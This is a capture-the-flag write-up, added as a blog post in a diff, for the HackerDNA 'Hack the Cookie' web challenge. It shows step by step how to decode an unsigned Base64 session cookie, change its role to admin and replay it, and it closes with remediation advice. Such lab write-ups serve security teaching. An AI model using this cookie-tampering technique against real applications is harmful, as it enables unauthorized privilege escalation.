@@ -1,0 +1,108 @@
+---
+title: "HackerDNA — Hack the Cookie: Insecure Session Management"
+description: "Privilege escalation from guest to admin by decoding and modifying an unsigned Base64 session cookie. A classic case of client-side trust gone wrong."
+date: 2025-12-08T00:00:00.000Z
+tags: ["ctf", "web"]
+draft: false
+---
+
+**Platform:** HackerDNA
+**Challenge:** Hack the Cookie
+**Category:** Web
+**Difficulty:** Easy
+
+---
+
+## Overview
+
+The challenge involves escalating privileges from a guest user to admin by exploiting insecure cookie handling. No signatures. No encryption. Just vibes.
+
+**Tools:** Burp Suite, FoxyProxy, any Base64 decoder
+
+---
+
+## Step 1 — Login as Guest
+
+Credentials given: `guest:guest`
+
+Log in, land on the dashboard. Application shows "low privileges" for the guest role. Something to escalate.
+
+---
+
+## Step 2 — Intercept the Cookie
+
+Route traffic through Burp Suite. After login, inspect the response headers. There's a cookie:
+
+```
+user_session: eyJ1c2VyX2lkIjoxLCJ1c2...
+```
+
+Looks like Base64.
+
+---
+
+## Step 3 — Decode It
+
+```bash
+echo "eyJ1c2VyX2lkIjoxLCJ1c2Vyb..." | base64 -d
+```
+
+Output:
+
+```json
+{
+  "user_id": 1,
+  "username": "guest",
+  "role": "guest",
+  "email": "guest@techcorp.local"
+}
+```
+
+Session data stored client-side. No HMAC. No signature. The role is just a field in a JSON blob.
+
+---
+
+## Step 4 — Modify and Re-encode
+
+Change `"role": "guest"` to `"role": "admin"`:
+
+```json
+{"user_id":1,"username":"guest","role":"admin","email":"guest@techcorp.local"}
+```
+
+Encode back to Base64:
+
+```bash
+echo -n '{"user_id":1,"username":"guest","role":"admin","email":"guest@techcorp.local"}' | base64
+```
+
+---
+
+## Step 5 — Inject and Forward
+
+In Burp, replace the `user_session` cookie value with the modified one. Forward the request.
+
+Application accepts it without question. Admin panel loads. Flag captured.
+
+---
+
+## Why It Works
+
+The server trusted the cookie value entirely — never validated it server-side, never signed it. Base64 is encoding, not encryption. Anyone can decode it, modify it, re-encode it.
+
+The vulnerability: **client-side session data with no integrity protection.**
+
+---
+
+## The Fix
+
+- Never store sensitive data client-side without cryptographic protection
+- Use signed cookies (JWT with proper signatures, or HMAC-protected values)
+- Implement server-side session management — store session data on the server, only send a session ID to the client
+- Validate roles server-side on every privileged action, never trust client input for authorization decisions
+
+**Remember:** Base64 is not security. It's just encoding.
+
+---
+
+*0xAdham*
